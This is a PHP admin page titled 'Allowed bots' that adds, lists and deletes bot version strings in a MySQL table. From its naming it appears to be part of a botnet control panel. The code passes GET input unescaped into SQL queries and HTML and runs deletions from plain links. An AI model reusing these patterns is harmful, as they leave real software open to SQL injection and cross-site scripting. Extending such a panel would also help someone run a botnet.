<?php
  require("passwd.inc");
  require("../cfg.php");

  header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");  
  header("Last-Modified: " . gmdate( "D, d M Y H:i:s") . " GMT"); 
  header("Cache-Control: no-cache, must-revalidate"); 
  header("Pragma: no-cache");
?>

<html>
<head>
<title>Select bot version</title>
<meta http-equiv="Content-Type" content="text/html; charset=Windows-1251">
<style>

A:link {color: #0049AA; font-size: 13px; text-decoration: underline; font-weight: bold;}
A:unactive {color: #0049AA; font-size: 13px; text-decoration: underline; font-weight: bold;}
A:visited {color: #0049AA; font-size: 13px; text-decoration: underline; font-weight: bold;}
A:hover {color: #0049AA; font-size: 13px; text-decoration: none; font-weight: bold;}

.t1 {
  border-collapse: collapse;
}

.t1 td {
  padding: 2px 3px;
  border: solid 1px #666;
}

.t1 th {
  padding: 2px 3px;
  border: solid 1px #666;
  background: #ccc;
}


</style>
</head>
<body>


<?php
  $action = $_GET['action'];
  if ($action === "clear") {
    @mysql_query("DELETE FROM Bots;");
  }
  elseif ($action === "Add version")
  {
    $ver = $_GET['Ver'];

    @mysql_query("INSERT INTO Bots (Ver) VALUES ('$ver');");
  
  }
  elseif ($action === "deleteversion")
  {
    $ver = $_GET['Ver'];
    
    @mysql_query("DELETE FROM Bots WHERE `Ver`='$ver';");
  }
    
  
  echo "<hr>\r\n";
  echo "<div align='center'><h2>Allowed bots</h2></div>\r\n";
  include("menu.inc");
  echo "<hr>\r\n";

  echo "<table border='1' align='CENTER'>";
  echo "<tr>";
  echo "<td>Ver</td><td>Action</td>";
  echo "</tr>\r\n";
  
  $Bots = @mysql_query("SELECT * FROM Bots ORDER BY Ver;");
  if (mysql_num_rows($Bots) < 1)
  {
    echo "<tr><td>all</td></tr>";
  } else {
    for ($i=0; $i < mysql_num_rows($Bots); $i++) {
      $ver = mysql_result($Bots,$i,'Ver');
      echo "<tr>";
      echo "<td>$ver</td>";
      echo "<td><font size=small><a href=\"?action=deleteversion&Ver=$ver\">Delete</a></font</td>";
      echo "</tr>";
    }
  }
  echo "</table>";

  echo "<center><a href=\"?action=clear\">Clear all</a></center><br>";

  echo "<form action=\"selectversion.php\" method=\"GET\">Version: <input type=text value=\"\" name=\"Ver\">";
  echo "<input type=submit name=action value=\"Add version\">";
  echo "</form><br>";
  //mysql_close($dbase);
?>


</body>
</html>